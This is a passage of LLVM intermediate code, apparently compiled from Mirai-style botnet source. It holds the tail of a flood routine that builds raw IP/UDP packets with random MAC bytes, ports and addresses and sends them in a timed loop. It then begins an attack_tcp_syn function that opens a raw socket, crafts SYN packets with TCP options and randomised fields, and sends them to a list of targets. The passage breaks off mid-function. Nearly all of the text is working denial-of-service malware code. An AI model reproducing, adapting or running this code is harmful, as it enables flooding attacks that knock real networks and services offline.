  %339 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  %341 = load i16, i16* %340, align 4
  %342 = zext i16 %341 to i32
  %343 = sub nsw i32 %342, 1000
  %344 = xor i32 %343, -1
  %345 = trunc i32 %344 to i16
  %346 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 3
  store i16 %345, i16* %347, align 4
  br label %348

; <label>:348:                                    ; preds = %333, %329
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %358

; <label>:352:                                    ; preds = %348
  %353 = call i32 @rand_next()
  %354 = and i32 %353, 65535
  %355 = trunc i32 %354 to i16
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 0
  store i16 %355, i16* %357, align 2
  br label %358

; <label>:358:                                    ; preds = %352, %348
  %359 = load i16, i16* %19, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  br i1 %361, label %362, label %368

; <label>:362:                                    ; preds = %358
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  br label %368

; <label>:368:                                    ; preds = %362, %358
  %369 = load i8, i8* %22, align 1
  %370 = icmp ne i8 %369, 0
  br i1 %370, label %375, label %371

; <label>:371:                                    ; preds = %368
  %372 = call i32 @rand_next()
  %373 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %381

; <label>:375:                                    ; preds = %368
  %376 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 9
  store i32 %378, i32* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %375, %371
  %382 = call i32 @rand_next()
  store i32 %382, i32* %40, align 4
  %383 = call i32 @rand_next()
  store i32 %383, i32* %41, align 4
  %384 = call i32 @rand_next()
  store i32 %384, i32* %42, align 4
  %385 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i32 0, i32 0
  %388 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %387, i8* %388, i32 4)
  %389 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %390 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %389, i32 0, i32 1
  %391 = getelementptr inbounds [6 x i8], [6 x i8]* %390, i32 0, i32 0
  %392 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %391, i8* %392, i32 4)
  %393 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %394 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %393, i32 0, i32 0
  %395 = getelementptr inbounds [6 x i8], [6 x i8]* %394, i32 0, i32 0
  %396 = getelementptr inbounds i8, i8* %395, i64 4
  %397 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 2)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 1
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %42 to i8*
  %403 = getelementptr inbounds i8, i8* %402, i64 2
  call void @util_memcpy(i8* %401, i8* %403, i32 2)
  %404 = load i8, i8* %21, align 1
  %405 = icmp ne i8 %404, 0
  br i1 %405, label %406, label %413

; <label>:406:                                    ; preds = %381
  %407 = load i8*, i8** %39, align 8
  %408 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %407, i32 %408)
  %409 = load i8*, i8** %39, align 8
  %410 = load i32, i32* %20, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8, i8* %409, i64 %411
  store i8 0, i8* %412, align 1
  br label %413

; <label>:413:                                    ; preds = %406, %381
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = bitcast %struct.iphdr* %416 to i16*
  %418 = call zeroext i16 @checksum_generic(i16* %417, i32 20)
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %424 = bitcast %struct.iphdr* %423 to i16*
  %425 = call zeroext i16 @checksum_generic(i16* %424, i32 20)
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %431 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %432 = bitcast %struct.udphdr* %431 to i8*
  %433 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 2
  %435 = load i16, i16* %434, align 2
  %436 = load i32, i32* %20, align 4
  %437 = sext i32 %436 to i64
  %438 = add i64 8, %437
  %439 = trunc i64 %438 to i32
  %440 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %430, i8* %432, i16 zeroext %435, i32 %439)
  %441 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 2
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 0
  store i16 2, i16* %448, align 4
  %449 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 9
  %451 = load i32, i32* %450, align 4
  %452 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %453 = load i32, i32* %11, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i64 %454
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i32 0, i32 0
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %456, i32 0, i32 2
  %458 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %457, i32 0, i32 0
  store i32 %451, i32* %458, align 4
  %459 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %460 = load i32, i32* %11, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %463, i32 0, i32 1
  store i16 0, i16* %464, align 2
  %465 = load i32, i32* %12, align 4
  %466 = load i8*, i8** %33, align 8
  %467 = load i32, i32* %20, align 4
  %468 = sext i32 %467 to i64
  %469 = add i64 66, %468
  %470 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %471 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %472 = load i32, i32* %11, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i64 %473
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i32 0, i32 0
  %476 = bitcast %struct.sockaddr_in* %475 to %struct.sockaddr*
  store %struct.sockaddr* %476, %struct.sockaddr** %470, align 8
  %477 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %478 = load %struct.sockaddr*, %struct.sockaddr** %477, align 8
  %479 = call i64 @sendto(i32 %465, i8* %466, i64 %469, i32 16384, %struct.sockaddr* %478, i32 16)
  br label %480

; <label>:480:                                    ; preds = %413
  %481 = load i32, i32* %11, align 4
  %482 = add nsw i32 %481, 1
  store i32 %482, i32* %11, align 4
  br label %265

; <label>:483:                                    ; preds = %265
  %484 = call i64 @time(i64* null) #6
  %485 = load i32, i32* %24, align 4
  %486 = sext i32 %485 to i64
  %487 = icmp sgt i64 %484, %486
  br i1 %487, label %488, label %489

; <label>:488:                                    ; preds = %483
  br label %490

; <label>:489:                                    ; preds = %483
  br label %264

; <label>:490:                                    ; preds = %488, %100, %94
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %104, i32* %12, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %5
  br label %451

; <label>:107:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %108 = load i32, i32* %12, align 4
  %109 = bitcast i32* %11 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

; <label>:112:                                    ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = call i32 @close(i32 %113)
  br label %451

; <label>:115:                                    ; preds = %107
  store i32 0, i32* %11, align 4
  br label %116

; <label>:116:                                    ; preds = %293, %115
  %117 = load i32, i32* %11, align 4
  %118 = load i8, i8* %7, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  br i1 %120, label %121, label %296

; <label>:121:                                    ; preds = %116
  %122 = call noalias i8* @calloc(i64 128, i64 1) #6
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %30, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.tcphdr*
  store %struct.tcphdr* %135, %struct.tcphdr** %31, align 8
  %136 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i64 1
  %138 = bitcast %struct.tcphdr* %137 to i8*
  store i8* %138, i8** %32, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, 15
  %143 = or i8 %142, 64
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, -16
  %148 = or i8 %147, 5
  store i8 %148, i8* %145, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = call zeroext i16 @htons(i16 zeroext 60) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

; <label>:164:                                    ; preds = %121
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

; <label>:168:                                    ; preds = %164, %121
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 6, i8* %170, align 1
  %171 = load i32, i32* %28, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 1
  %179 = load i32, i32* %178, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load i16, i16* %18, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  store i16 %183, i16* %185, align 4
  %186 = load i16, i16* %19, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 1
  store i16 %187, i16* %189, align 2
  %190 = load i32, i32* %20, align 4
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = zext i16 %192 to i32
  %194 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 2
  store i32 %193, i32* %195, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = and i16 %198, -241
  %200 = or i16 %199, 160
  store i16 %200, i16* %197, align 4
  %201 = load i8, i8* %22, align 1
  %202 = sext i8 %201 to i16
  %203 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = and i16 %202, 1
  %207 = shl i16 %206, 13
  %208 = and i16 %205, -8193
  %209 = or i16 %208, %207
  store i16 %209, i16* %204, align 4
  %210 = load i8, i8* %23, align 1
  %211 = sext i8 %210 to i16
  %212 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %211, 1
  %216 = shl i16 %215, 12
  %217 = and i16 %214, -4097
  %218 = or i16 %217, %216
  store i16 %218, i16* %213, align 4
  %219 = load i8, i8* %24, align 1
  %220 = sext i8 %219 to i16
  %221 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %220, 1
  %225 = shl i16 %224, 11
  %226 = and i16 %223, -2049
  %227 = or i16 %226, %225
  store i16 %227, i16* %222, align 4
  %228 = load i8, i8* %25, align 1
  %229 = sext i8 %228 to i16
  %230 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %229, 1
  %234 = shl i16 %233, 10
  %235 = and i16 %232, -1025
  %236 = or i16 %235, %234
  store i16 %236, i16* %231, align 4
  %237 = load i8, i8* %26, align 1
  %238 = sext i8 %237 to i16
  %239 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %238, 1
  %243 = shl i16 %242, 9
  %244 = and i16 %241, -513
  %245 = or i16 %244, %243
  store i16 %245, i16* %240, align 4
  %246 = load i8, i8* %27, align 1
  %247 = sext i8 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %247, 1
  %252 = shl i16 %251, 8
  %253 = and i16 %250, -257
  %254 = or i16 %253, %252
  store i16 %254, i16* %249, align 4
  %255 = load i8*, i8** %32, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %32, align 8
  store i8 2, i8* %255, align 1
  %257 = load i8*, i8** %32, align 8
  %258 = getelementptr inbounds i8, i8* %257, i32 1
  store i8* %258, i8** %32, align 8
  store i8 4, i8* %257, align 1
  %259 = call i32 @rand_next()
  %260 = and i32 %259, 15
  %261 = add i32 1400, %260
  %262 = trunc i32 %261 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load i8*, i8** %32, align 8
  %265 = bitcast i8* %264 to i16*
  store i16 %263, i16* %265, align 2
  %266 = load i8*, i8** %32, align 8
  %267 = getelementptr inbounds i8, i8* %266, i64 2
  store i8* %267, i8** %32, align 8
  %268 = load i8*, i8** %32, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %32, align 8
  store i8 4, i8* %268, align 1
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %32, align 8
  store i8 2, i8* %270, align 1
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %32, align 8
  store i8 8, i8* %272, align 1
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %32, align 8
  store i8 10, i8* %274, align 1
  %276 = call i32 @rand_next()
  %277 = load i8*, i8** %32, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 %276, i32* %278, align 4
  %279 = load i8*, i8** %32, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 0, i32* %282, align 4
  %283 = load i8*, i8** %32, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %32, align 8
  %285 = load i8*, i8** %32, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %32, align 8
  store i8 1, i8* %285, align 1
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %32, align 8
  store i8 3, i8* %287, align 1
  %289 = load i8*, i8** %32, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %32, align 8
  store i8 3, i8* %289, align 1
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %32, align 8
  store i8 6, i8* %291, align 1
  br label %293

; <label>:293:                                    ; preds = %168
  %294 = load i32, i32* %11, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %11, align 4
  br label %116

; <label>:296:                                    ; preds = %116
  br label %297

; <label>:297:                                    ; preds = %450, %296
  store i32 0, i32* %11, align 4
  br label %298

; <label>:298:                                    ; preds = %441, %297
  %299 = load i32, i32* %11, align 4
  %300 = load i8, i8* %7, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %299, %301
  br i1 %302, label %303, label %444

; <label>:303:                                    ; preds = %298
  %304 = load i8**, i8*** %13, align 8
  %305 = load i32, i32* %11, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8*, i8** %304, i64 %306
  %308 = load i8*, i8** %307, align 8
  store i8* %308, i8** %33, align 8
  %309 = load i8*, i8** %33, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %34, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %35, align 8
  %314 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %315 = load i32, i32* %11, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i64 %316
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i32 0, i32 2
  %319 = load i8, i8* %318, align 4
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %320, 32
  br i1 %321, label %322, label %343

; <label>:322:                                    ; preds = %303
  %323 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 1
  %328 = load i32, i32* %327, align 4
  %329 = call i32 @ntohl(i32 %328) #7
  %330 = call i32 @rand_next()
  %331 = load %struct.attack_target*, %struct.attack_target** %8, align 8
